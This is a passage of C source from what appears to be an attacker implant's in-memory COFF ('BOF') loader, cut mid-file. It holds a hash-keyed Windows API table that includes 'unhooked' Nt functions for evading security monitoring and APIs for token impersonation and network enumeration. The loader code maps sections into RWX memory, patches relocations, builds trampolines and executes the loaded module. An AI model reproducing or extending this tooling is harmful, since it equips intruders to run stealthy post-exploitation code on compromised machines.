    { 0xE1AD8D82, (void*)&__imp_GetVersionExW },
    { 0x9966BD60, (void*)&__imp_GetNativeSystemInfo },
    { 0xFED629BA, (void*)&__imp_VirtualAlloc },
    { 0x0F7DB0F1, (void*)&__imp_VirtualFree },
    { 0x9DE92070, (void*)&__imp_VirtualProtect },
    { 0xFFFC83E5, (void*)&__imp_VirtualQuery },
    { 0x9971FC11, (void*)&__imp_HeapAlloc },
    { 0x142D1468, (void*)&__imp_HeapFree },
    { 0x1BD5F1BE, (void*)&__imp_LocalAlloc },
    { 0x1FE28875, (void*)&__imp_LocalFree },
    { 0x643F1B04, (void*)&__imp_GlobalAlloc },
    { 0xF388A0FB, (void*)&__imp_GlobalFree },
    { 0x9FEFD48A, (void*)&__imp_RtlMoveMemory },
    { 0xF187EB0E, (void*)&__imp_RtlCopyMemory },
    { 0xA9008F1A, (void*)&__imp_RtlFillMemory },
    { 0x985BD533, (void*)&__imp_RtlZeroMemory },
    { 0xAFA92BAD, (void*)&__imp_lstrlenA },
    { 0xAFA92BC3, (void*)&__imp_lstrlenW },
    { 0xAFA46C7A, (void*)&__imp_lstrcpyA },
    { 0xAFA46C90, (void*)&__imp_lstrcpyW },
    { 0xAFA42C06, (void*)&__imp_lstrcatA },
    { 0xAFA42C1C, (void*)&__imp_lstrcatW },
    { 0xAFA45E8E, (void*)&__imp_lstrcmpA },
    { 0xAFA45EA4, (void*)&__imp_lstrcmpW },
    { 0xA43035B7, (void*)&__imp_lstrcmpiA },
    { 0xA43035CD, (void*)&__imp_lstrcmpiW },
    { 0x4306CF51, (void*)&__imp_MultiByteToWideChar },
    { 0x46662691, (void*)&__imp_WideCharToMultiByte },
    { 0x2C2133B7, (void*)&__imp_FormatMessageA },
    { 0x2C2133CD, (void*)&__imp_FormatMessageW },
    { 0xF8B43544, (void*)&__imp_GetEnvironmentVariableA },
    { 0xF8B4355A, (void*)&__imp_GetEnvironmentVariableW },
    { 0x5B37A650, (void*)&__imp_SetEnvironmentVariableA },
    { 0x5B37A666, (void*)&__imp_SetEnvironmentVariableW },
    { 0xDF138448, (void*)&__imp_ExpandEnvironmentStringsA },
    { 0xDF13845E, (void*)&__imp_ExpandEnvironmentStringsW },
    { 0x01D10790, (void*)&__imp_GetCommandLineA },
    { 0x01D107A6, (void*)&__imp_GetCommandLineW },
    { 0xA24489B0, (void*)&__imp_GetModuleFileNameA },
    { 0xA24489C6, (void*)&__imp_GetModuleFileNameW },
    { 0x814A8088, (void*)&__imp_GetStartupInfoA },
    { 0x814A809E, (void*)&__imp_GetStartupInfoW },
    { 0xD9DCAFFF, (void*)&__imp_FreeLibrary },
    { 0xC67B97B3, (void*)&__imp_GetConsoleWindow },
    { 0x948599E6, (void*)&__imp_AllocConsole },
    { 0x33E96E1D, (void*)&__imp_FreeConsole },
    { 0x8BA3BCF0, (void*)&__imp_AttachConsole },
    { 0x5F51304A, (void*)&__imp_IsDebuggerPresent },
    { 0xC2772778, (void*)&__imp_CheckRemoteDebuggerPresent },
    { 0x07FE87F8, (void*)&__imp_OutputDebugStringA },
    { 0x07FE880E, (void*)&__imp_OutputDebugStringW },
    { 0x1A24DF99, (void*)&__imp_OpenProcess },
    { 0xAA1C443A, (void*)&__imp_OpenProcessToken },
    { 0x623B02C1, (void*)&__imp_DuplicateTokenEx },
    { 0x182B739D, (void*)&__imp_ImpersonateLoggedOnUser },
    { 0x1F794CCD, (void*)&__imp_RevertToSelf },
    { 0x41C7A007, (void*)&__imp_LookupPrivilegeValueA },
    { 0x41C7A01D, (void*)&__imp_LookupPrivilegeValueW },
    { 0x54660B4E, (void*)&__imp_AdjustTokenPrivileges },
    { 0x117B594F, (void*)&__imp_CreateProcessAsUserA },
    { 0x117B5965, (void*)&__imp_CreateProcessAsUserW },
    { 0xA337F5DF, (void*)&__imp_RegOpenKeyExA },
    { 0xA337F5F5, (void*)&__imp_RegOpenKeyExW },
    { 0x938DBEE1, (void*)&__imp_RegCreateKeyExA },
    { 0x938DBEF7, (void*)&__imp_RegCreateKeyExW },
    { 0x4DF1A1CD, (void*)&__imp_RegSetValueExA },
    { 0x4DF1A1E3, (void*)&__imp_RegSetValueExW },
    { 0x503644B7, (void*)&__imp_RegQueryValueExA },
    { 0x503644CD, (void*)&__imp_RegQueryValueExW },
    { 0x0661A997, (void*)&__imp_RegDeleteValueA },
    { 0x0661A9AD, (void*)&__imp_RegDeleteValueW },
    { 0x1C5918C5, (void*)&__imp_RegCloseKey },
    { 0x08F879E2, (void*)&__imp_RegEnumKeyExA },
    { 0x08F879F8, (void*)&__imp_RegEnumKeyExW },
    { 0x22527F99, (void*)&__imp_RegEnumValueA },
    { 0x22527FAF, (void*)&__imp_RegEnumValueW },
    { 0x010E816A, (void*)&__imp_CryptAcquireContextA },
    { 0x010E8180, (void*)&__imp_CryptAcquireContextW },
    { 0xC571A5B2, (void*)&__imp_CryptCreateHash },
    { 0xE2133318, (void*)&__imp_CryptHashData },
    { 0xBC745EC2, (void*)&__imp_CryptDeriveKey },
    { 0x06D568DF, (void*)&__imp_CryptEncrypt },
    { 0xA4DCBE75, (void*)&__imp_CryptDecrypt },
    { 0x70DC27C0, (void*)&__imp_CryptReleaseContext },
    { 0x2CF27A88, (void*)&__imp_CryptDestroyHash },
    { 0x7D7BC36D, (void*)&__imp_CryptDestroyKey },
    { 0xAEE370B5, (void*)&__imp_CryptGenRandom },
    { 0xDB66BDC9, (void*)&__imp_CoInitializeEx },
    { 0x1ADF272F, (void*)&__imp_CoUninitialize },
    { 0xA36CDCC3, (void*)&__imp_CoCreateInstance },
    { 0x80DEF32E, (void*)&__imp_CoTaskMemFree },
    { 0x087CF3A9, (void*)&__imp_IIDFromString },
    { 0x7CAFBCCE, (void*)&__imp_StringFromGUID2 },
    { 0xE3ADAC11, (void*)&__imp_VariantInit },
    { 0x58F56F64, (void*)&__imp_VariantClear },
    { 0x635DB985, (void*)&__imp_VariantChangeType },
    { 0x91EF9789, (void*)&__imp_SysAllocString },
    { 0x2975E500, (void*)&__imp_SysFreeString },
    { 0xEE4F271D, (void*)&__imp_SysStringLen },
    { 0x85FD59CD, (void*)&__imp_SHGetFolderPathA },
    { 0x85FD59E3, (void*)&__imp_SHGetFolderPathW },
    { 0x8829A599, (void*)&__imp_SHGetKnownFolderPath },
    { 0x92ACE1D6, (void*)&__imp_PathFileExistsA },
    { 0x92ACE1EC, (void*)&__imp_PathFileExistsW },
    { 0x55F89773, (void*)&__imp_PathCombineA },
    { 0x55F89789, (void*)&__imp_PathCombineW },
    { 0x00C84C9A, (void*)&__imp_GetDesktopWindow },
    { 0xE1F8D8D8, (void*)&__imp_GetShellWindow },
    { 0x312E0B02, (void*)&__imp_FindWindowA },
    { 0x312E0B18, (void*)&__imp_FindWindowW },
    { 0x3DBDBE88, (void*)&__imp_EnumWindows },
    { 0xE1DABEE6, (void*)&__imp_GetWindowTextA },
    { 0xE1DABEFC, (void*)&__imp_GetWindowTextW },
    { 0x28E4B080, (void*)&__imp_GetClassNameA },
    { 0x28E4B096, (void*)&__imp_GetClassNameW },
    { 0x5C0E5E98, (void*)&__imp_SendMessageA },
    { 0x5C0E5EAE, (void*)&__imp_SendMessageW },
    { 0x0CFEE074, (void*)&__imp_EnumProcesses },
    { 0x346A87F5, (void*)&__imp_EnumProcessModules },
    { 0x891BC7EB, (void*)&__imp_GetModuleBaseNameA },
    { 0x891BC801, (void*)&__imp_GetModuleBaseNameW },
    { 0x57DE9514, (void*)&__imp_GetModuleInformation },
    { 0xFDA64AFD, (void*)&__imp_WSASocketA },
    { 0xFDA64B13, (void*)&__imp_WSASocketW },
    { 0x092FFBE6, (void*)&__imp_WSAStartup },
    { 0x2721E0DB, (void*)&__imp_WSACleanup },
    { 0xA9844105, (void*)&__imp_bind },
    { 0x32EF3BF7, (void*)&__imp_listen },
    { 0x18D0E598, (void*)&__imp_accept },
    { 0xE9ABC612, (void*)&__imp_connect },
    { 0xA98D8272, (void*)&__imp_send },
    { 0xA98CF4B8, (void*)&__imp_recv },
    { 0xF23A92C7, (void*)&__imp_closesocket },
    { 0xAFCAB7CC, (void*)&__imp_ioctlsocket },
    { 0x0D2437E7, (void*)&__imp_gethostname },
    { 0xCCC6BC02, (void*)&__imp_gethostbyname },
    { 0x2572AF8F, (void*)&__imp_getaddrinfo },
    { 0x191043F1, (void*)&__imp_freeaddrinfo },
    { 0xDA7F02D4, (void*)&__imp_htons },
    { 0xDAEB9514, (void*)&__imp_ntohs },
    { 0xDA7F02CD, (void*)&__imp_htonl },
    { 0xDAEB950D, (void*)&__imp_ntohl },
    { 0x9139FDE3, (void*)&__imp_NetUserEnum },
    { 0xA4EE8EBC, (void*)&__imp_NetLocalGroupEnum },
    { 0x76F037D7, (void*)&__imp_NetShareEnum },
    { 0xE894CE2D, (void*)&__imp_NetWkstaUserEnum },
    { 0x9A86FC28, (void*)&__imp_NetSessionEnum },
    { 0xECDEDF85, (void*)&__imp_NetApiBufferFree },
    { 0x125D032E, (void*)&__imp_WNetOpenEnumA },
    { 0x125D0344, (void*)&__imp_WNetOpenEnumW },
    { 0x132EDC04, (void*)&__imp_WNetEnumResourceA },
    { 0x132EDC1A, (void*)&__imp_WNetEnumResourceW },
    { 0xFB1D0651, (void*)&__imp_WNetCloseEnum },
    { 0xB04FAEA9, (void*)&__imp__stricmp }, 
    { 0x2C04DDAB, (void*)&__imp_Process32Next },
    { 0xB9A0744A, (void*)&__imp_IsWow64Process },
    { 0xAC11E754, (void*)&__imp_Process32First },
    { 0xFD247938, (void*)&__imp_CreateToolhelp32Snapshot },
    { 0xE60AAD2E, (void*)&g_pNtCreateFileUnhooked },
    { 0x4D6684E5, (void*)&g_pNtWriteVirtualMemoryUnhooked },
    { 0x51115B9B, (void*)&g_pNtProtectVirtualMemoryUnhooked },
    { 0x88FE4803, (void*)&g_pNtResumeThreadUnhooked },
    { 0x14F75183, (void*)&g_pNtCreateThreadExUnhooked },
    { 0x720d4ddc, (void*)wsprintfW },                 // "__imp_wsprintfW"
    { 0x24b5251e, (void*)wcscpy }, // "wcscpy"
    { 0xbb5f990c, (void*)wcsncpy }, // "wcsncpy"
    { 0xa0396ff7, (void*)mbstowcs }, // "mbstowcs"
    { 0x24b5232a, (void*)wcscat }, // "wcscat"
    { 0x24b549f1, (void*)wcslen }, // "wcslen"
    { 0x0d82b830, (void*)memset }, // "memset"
    { 0x0d827590, (void*)memcpy }, // "memcpy"
    { 0x1c9396ca, (void*)strcpy }, // "strcpy"
    { 0x1c9394d6, (void*)strcat }, // "strcat"
    { 0x1c93bb9d, (void*)strlen }, // "strlen"
    { 0x156b2bb8, (void*)printf }, // "printf"
    { 0xa5b50f0b, (void*)sprintf }, // "sprintf"
    { 0x7acb5457, (void*)ExitThread }, // "ExitThread"
    { 0x720d4dc6, (void*)wsprintfA }, // "__imp_wsprintfA"
    { 0x2082eae3, (void*)GetLastError },
    { 0, NULL } // Terminador
};

typedef void (__attribute__((ms_abi)) * bof_func_t)(char*, int);

// === Trampolines ===
static void* g_trampoline_page = NULL;
static int   g_trampoline_offset = 0;

static void* create_trampoline(void* target) {
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ create_trampoline nulled target=NULL\n");
        return NULL;
    }

    // Allocate executable memory for trampoline
    void* trampoline = VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!trampoline) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ can't assign memory to trampolín\n");
        return NULL;
    }
    
    unsigned char* code = (unsigned char*)trampoline;
    
    // mov rax, target (48 B8 + 8 bytes address)
    code[0] = 0x48; // REX.W prefix
    code[1] = 0xB8; // MOV RAX, imm64
    *(uint64_t*)(code + 2) = (uint64_t)target;
    
    // jmp rax (FF E0)
    code[10] = 0xFF; // JMP
    code[11] = 0xE0; // /4 rax
    
    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🚀 Trampolín created in %p -> %p \n", trampoline, target);
    return trampoline;
}
BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target, 
                      void** sections, const char* sym_name, void* base_addr) {
    
    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🔧 Apply reloc type %d in 0x%p -> 0x%p \n", 
                rel->Type, patch_addr, target);
    
    switch (rel->Type) {
        case IMAGE_REL_AMD64_ABSOLUTE: {
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_ABSOLUTE (ignored) \n");
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_ADDR64: {
            DWORD oldProtect;
            if (!VirtualProtect(patch_addr, sizeof(uint64_t), PAGE_READWRITE, &oldProtect)) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ can't change the protection to ADDR64 \n");
                return FALSE;
            }
            *(uint64_t*)patch_addr = (uint64_t)target;
            VirtualProtect(patch_addr, sizeof(uint64_t), oldProtect, &oldProtect);
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_ADDR64: 0x%llX \n", (uint64_t)target);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_ADDR32: {
            if ((uint64_t)target > 0xFFFFFFFF) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ ADDR32: addres out of range 32-bit\n");
                return FALSE;
            }
            *(uint32_t*)patch_addr = (uint32_t)(uintptr_t)target;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_ADDR32: 0x%X \n", (uint32_t)(uintptr_t)target);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_ADDR32NB: {
            uint32_t rva;
            if (base_addr) {
                rva = (uint32_t)((char*)target - (char*)base_addr);
            } else {
                rva = (uint32_t)((char*)target - (char*)sections[0]);
            }
            *(uint32_t*)patch_addr = rva;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_ADDR32NB: 0x%X \n", rva);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_REL32: {
            int64_t offset = (int64_t)target - ((int64_t)patch_addr + 4);
            if (offset < INT32_MIN || offset > INT32_MAX) {
                void* trampoline = create_trampoline(target);
                if (!trampoline) {
                    BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Trampolín failed to '%s' \n", sym_name);
                    return FALSE;
                }
                offset = (int64_t)trampoline - ((int64_t)patch_addr + 4);
                if (offset < INT32_MIN || offset > INT32_MAX) {
                    BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Trampolín out range to '%s' \n", sym_name);
                    return FALSE;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🚀 doing trampolin '%s': %p \n", sym_name, trampoline);
            }
            *(int32_t*)patch_addr = (int32_t)offset;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32: 0x%X \n", (int32_t)offset);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_REL32_1: {
            int64_t offset = (int64_t)target - ((int64_t)patch_addr + 5);
            if (offset < INT32_MIN || offset > INT32_MAX) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_1 out range to '%s' \n", sym_name);
                return FALSE;
            }
            *(int32_t*)patch_addr = (int32_t)offset;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32_1: 0x%X \n", (int32_t)offset);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_REL32_2: {
            int64_t offset = (int64_t)target - ((int64_t)patch_addr + 6);
            if (offset < INT32_MIN || offset > INT32_MAX) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_2 out range to '%s' \n", sym_name);
                return FALSE;
            }
            *(int32_t*)patch_addr = (int32_t)offset;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32_2: 0x%X \n", (int32_t)offset);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_REL32_3: {
            int64_t offset = (int64_t)target - ((int64_t)patch_addr + 7);
            if (offset < INT32_MIN || offset > INT32_MAX) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_3 out range to '%s'\n", sym_name);
                return FALSE;
            }
            *(int32_t*)patch_addr = (int32_t)offset;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32_3: 0x%X \n", (int32_t)offset);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_REL32_4: {
            int64_t offset = (int64_t)target - ((int64_t)patch_addr + 8);
            if (offset < INT32_MIN || offset > INT32_MAX) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_4 out range to '%s'\n", sym_name);
                return FALSE;
            }
            *(int32_t*)patch_addr = (int32_t)offset;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32_4: 0x%X \n", (int32_t)offset);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_REL32_5: {
            int64_t offset = (int64_t)target - ((int64_t)patch_addr + 9);
            if (offset < INT32_MIN || offset > INT32_MAX) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_5 out range to '%s' \n", sym_name);
                return FALSE;
            }
            *(int32_t*)patch_addr = (int32_t)offset;
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32_5: 0x%X \n", (int32_t)offset);
            return TRUE;
        }
        
        case IMAGE_REL_AMD64_SECTION:
        case IMAGE_REL_AMD64_SECREL:
        case IMAGE_REL_AMD64_SECREL7:
        case IMAGE_REL_AMD64_TOKEN:
        case IMAGE_REL_AMD64_SREL32:
        case IMAGE_REL_AMD64_PAIR:
        case IMAGE_REL_AMD64_SSPAN32: {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ Type %d not implemented to '%s'\n", rel->Type, sym_name);
            return FALSE;
        }
        
        default: {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Type of rellocation x64 unknown: %d para '%s'\n", 
                        rel->Type, sym_name);
            return FALSE;
        }
    }
}

static char* get_symbol_name(COFFSymbol* s, char* strtab, uint32_t strtab_size) {
    if (s->Zeroes == 0 && s->Offset != 0) {
        if (s->Offset >= strtab_size) return NULL;
        char* name = strtab + s->Offset;
        for (int i = 0; i < 255 && name[i] != 0; i++) {
            if (name[i] < 32 || name[i] > 126) {
                return NULL;
            }
        }
        return name;
    } else {
        static char short_name[9];
        memcpy(short_name, s->Name, 8);
        short_name[8] = '\0';
        for (int i = 0; i < 8 && short_name[i] != 0; i++) {
            if (short_name[i] < 32 || short_name[i] > 126) {
                return NULL;
            }
        }
        return short_name;
    }
}

__attribute__((noinline))
static void call_go_aligned(void* func, char* arg1, int arg2) {
    typedef void (__attribute__((ms_abi)) *f_t)(char*, int);
    f_t f = (f_t)func;
    f(arg1, arg2);   // ← compiler emitirá callq + ret automáticamente
    
}

// === Cargador COFF MEJORADO ===
int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Begining RunCOFF - coff_data=%p, filesize=%u \n", coff_data, filesize);
    if (!coff_data || filesize < sizeof(COFFHeader)) return 1;

    COFFHeader* hdr = (COFFHeader*)coff_data;
    COFFSection* sect = (COFFSection*)(coff_data + sizeof(COFFHeader));
    COFFSymbol* sym = (COFFSymbol*)(coff_data + hdr->PointerToSymbolTable);
    uint32_t strtab_offset = hdr->PointerToSymbolTable + hdr->NumberOfSymbols * sizeof(COFFSymbol);
    char* strtab = (strtab_offset < filesize) ? (char*)(coff_data + strtab_offset) : NULL;
    uint32_t strtab_size = strtab ? (filesize - strtab_offset) : 0;

    BeaconPrintf(CALLBACK_ERROR, "[BOF] sections: %d \n", hdr->NumberOfSections);

    void** sections = calloc(hdr->NumberOfSections, sizeof(void*));
    if (!sections) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ calloc failed \n");
        return 1;
    }

    // Cargar secciones
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        size_t size = sect[i].SizeOfRawData;
        if (size == 0) size = 1;

        BeaconPrintf(CALLBACK_ERROR, "[BOF] VirtualAlloc section %d (size: %zu)\n", i, size);
        sections[i] = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!sections[i]) {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ VirtualAlloc failed to section %d \n", i);
            goto cleanup;
        }

        if (sect[i].PointerToRawData && sect[i].SizeOfRawData > 0) {
            if (sect[i].PointerToRawData + sect[i].SizeOfRawData > filesize) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ DAta out of range %d \n", i);
                goto cleanup;
            }
            memcpy(sections[i], coff_data + sect[i].PointerToRawData, sect[i].SizeOfRawData);
        }
    }

    BeaconPrintf(CALLBACK_ERROR, "[BOF] relocations \n");

    // Procesar relocalizaciones
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (!sect[i].PointerToRelocations || sect[i].NumberOfRelocations == 0) continue;

        if (sect[i].PointerToRelocations >= filesize) {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ PointerToRelocations section out of range %d \n", i);
            continue;
        }

        size_t total_reloc_size = (size_t)sect[i].NumberOfRelocations * sizeof(COFFRelocation);
        if (sect[i].PointerToRelocations + total_reloc_size > filesize) {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Buffer to small to rellocate section %d \n", i);
            continue;
        }

        COFFRelocation* rel_start = (COFFRelocation*)(coff_data + sect[i].PointerToRelocations);
        BeaconPrintf(CALLBACK_ERROR, "[BOF] Proccessing %d rellocation in section %d \n", sect[i].NumberOfRelocations, i);

        for (int j = 0; j < sect[i].NumberOfRelocations; j++) {
            COFFRelocation* rel = &rel_start[j];

            if (rel->SymbolTableIndex >= hdr->NumberOfSymbols) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ SymbolTableIndex %d out of range \n", rel->SymbolTableIndex);
                continue;
            }

            COFFSymbol* s = &sym[rel->SymbolTableIndex];
            char* sym_name = get_symbol_name(s, strtab, strtab_size);
            if (!sym_name) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ Simbol name CORRUPT (index %d) \n", rel->SymbolTableIndex);
                continue;
            }

            // Validar caracteres del nombre del símbolo
            int valid = 1;
            for (int k = 0; sym_name[k] != 0 && k < 255; k++) {
                if (sym_name[k] < 32 || sym_name[k] > 126) {
                    valid = 0;
                    break;
                }
            }
            if (!valid) continue;

            // Procesar prefijos de biblioteca
            char* search_name = sym_name;
            if (strncmp(sym_name, "KERNEL32$", 9) == 0) {
                search_name = sym_name + 9;
            } else if (strncmp(sym_name, "OLE32$", 6) == 0) {
                search_name = sym_name + 6;
            } else if (strncmp(sym_name, "OLEAUT32$", 9) == 0) {
                search_name = sym_name + 9;
            }

            // ✅ LOG DEL HASH — ¡CRUCIAL PARA DEPURAR!
            uint32_t name_hash = djb2_hash(search_name);
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🔍 Searching Simbol: '%s' (original: '%s') → HASH=0x%08X \n", search_name, sym_name, name_hash);

            void* target = NULL;
            char* patch_addr = (char*)sections[i] + rel->VirtualAddress;

            if (s->SectionNumber > 0) {
                if (s->SectionNumber - 1 >= hdr->NumberOfSections) {
                    BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ SectionNumber %d invalid \n", s->SectionNumber);
                    continue;
                }
                
                // Leer el addend del código compilado
                int32_t addend = *(int32_t*)patch_addr;
                target = (char*)sections[s->SectionNumber - 1] + s->Value + addend;
                
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Simbol intern '%s' → section %d + offset 0x%X + addend 0x%X = %p \n",
                            search_name, s->SectionNumber, s->Value, addend, target);
            } else {
                // Resolver símbolo externo por hash
                for (int k = 0; g_symbol_table[k].ptr; k++) {
                    if (g_symbol_table[k].hash == name_hash) {
                        target = g_symbol_table[k].ptr;
                        break;
                    }
                }
            }

            if (!target) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ SIMBOL NOT SOLVED: '%s' (hash=0x%08X) \n", search_name, name_hash);
                continue;
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ✅ Solved '%s' → %p", search_name, target);
            }

            if (rel->VirtualAddress >= sect[i].SizeOfRawData) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ VirtualAddress out of range %d \n", i);
                continue;
            }

            // ✅ Detecta si la reloc ya fue aplicada (evita sobrescritura)
            int32_t current_offset = *(int32_t*)patch_addr;
            int32_t expected_offset = (int32_t)((int64_t)target - ((int64_t)patch_addr + 4));
            if (current_offset == expected_offset) {
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Reloc %d applied (offset=0x%X), jumping \n", j, current_offset);
                continue;
            }

            // Aplicar relocalizaciones según arquitectura
#ifdef _WIN64
            const char* resolved_sym_name = sym_name; // Usamos el nombre que ya obtuvimos antes
            if (!handle_relocation(rel, patch_addr, target, sections, resolved_sym_name, /*base_addr*/ NULL)) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Failed rellocation type %d \n", rel->Type);
                continue;
            }
#else
            if (rel->Type == 6) { // IMAGE_REL_I386_REL32
                *(int32_t*)patch_addr = (int32_t)((char*)target - (patch_addr + 4));
                BeaconPrintf(CALLBACK_ERROR, "[BOF] Applied IMAGE_REL_I386_REL32 \n");
            } else if (rel->Type == 2) { // IMAGE_REL_I386_DIR32
                *(uint32_t*)patch_addr = (uint32_t)target;
                BeaconPrintf(CALLBACK_ERROR, "[BOF] Applied IMAGE_REL_I386_DIR32 \n");
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ Type of rellocation x86 unknown: %d \n", rel->Type);
            }
#endif
        }
    }

    // 🕵️‍♂️ DEBUG: Listar todos los símbolos
    BeaconPrintf(CALLBACK_ERROR, "[BOF] === LIST OF SIMBOLS === \n");
    for (int i = 0; i < hdr->NumberOfSymbols; i++) {
        char* sym_name = get_symbol_name(&sym[i], strtab, strtab_size);
        if (!sym_name) {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] Simbol %d: <CORRUPT name> \n", i);
            continue;
        }
        int valid = 1;
        for (int j = 0; sym_name[j] != 0 && j < 255; j++) {
            if (sym_name[j] < 32 || sym_name[j] > 126) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] Simbol %d: <invalid char in name> \n", i);
                valid = 0;
                break;
            }
        }
        if (valid) {
            BeaconPrintf(CALLBACK_ERROR, "[BOF] Simbol %d: '%s' (Section: %d, Value: 0x%X)\n", 
                        i, sym_name, sym[i].SectionNumber, sym[i].Value);
        }
    }
    BeaconPrintf(CALLBACK_ERROR, "[BOF] === END LIST ===\n");

    // BUSCAR FUNCIÓN DE ENTRADA
    BeaconPrintf(CALLBACK_ERROR, "[BOF] Searching FUNC '%s'...\n", functionname);
    bof_func_t go = NULL;
    for (int i = 0; i < hdr->NumberOfSymbols; i++) {
        char* sym_name = get_symbol_name(&sym[i], strtab, strtab_size);
        if (!sym_name) continue;

        if (strcmp(sym_name, functionname) == 0) {
            if (sym[i].SectionNumber <= 0 || sym[i].SectionNumber > hdr->NumberOfSections) {
                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Invalid section to '%s': %d \n", functionname, sym[i].SectionNumber);
                continue;
            }
            go = (bof_func_t)((char*)sections[sym[i].SectionNumber - 1] + sym[i].Value);
            BeaconPrintf(CALLBACK_ERROR, "[BOF] ✅ Func '%s' found in section %d, offset 0x%X → %p \n", 
                        functionname, sym[i].SectionNumber, sym[i].Value, go);
            break;
        }
    }

    // EJECUTAR FUNCIÓN
    if (go) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Exec go on %p \n", go);
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Bytes in go: %02X %02X %02X %02X %02X %02X %02X %02X \n",
            ((uint8_t*)go)[0], ((uint8_t*)go)[1], ((uint8_t*)go)[2], ((uint8_t*)go)[3],
            ((uint8_t*)go)[4], ((uint8_t*)go)[5], ((uint8_t*)go)[6], ((uint8_t*)go)[7]);
        DWORD old;
        VirtualProtect(go, 0x1000, PAGE_EXECUTE_READWRITE, &old);
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] code page prot changed to RWX \n");

        MEMORY_BASIC_INFORMATION mbi;
        VirtualQuery(go, &mbi, sizeof(mbi));
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] code  : base=%p  size=%p  prot=%08X \n",
                    mbi.BaseAddress, mbi.RegionSize, mbi.Protect);

        VirtualQuery((void*)((uintptr_t)&mbi & ~0xFFF), &mbi, sizeof(mbi));
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] stack: base=%p  size=%p  prot=%08X \n",
                    mbi.BaseAddress, mbi.RegionSize, mbi.Protect);
        // ✅ Llamada ALINEADA — ¡CRUCIAL PARA BOFs GRANDES!
        call_go_aligned(go, (char*)argumentdata, argumentSize);

        BeaconPrintf(CALLBACK_OUTPUT, "[COFF] ✅ End '%s'\n", functionname);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[COFF] ❌ Func '%s' not found\n", functionname);
    }

cleanup:
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (sections[i]) VirtualFree(sections[i], 0, MEM_RELEASE);
    }
    free(sections);

    if (g_trampoline_page) {
        VirtualFree(g_trampoline_page, 0, MEM_RELEASE);
        g_trampoline_page = NULL;
        g_trampoline_offset = 0;
    }

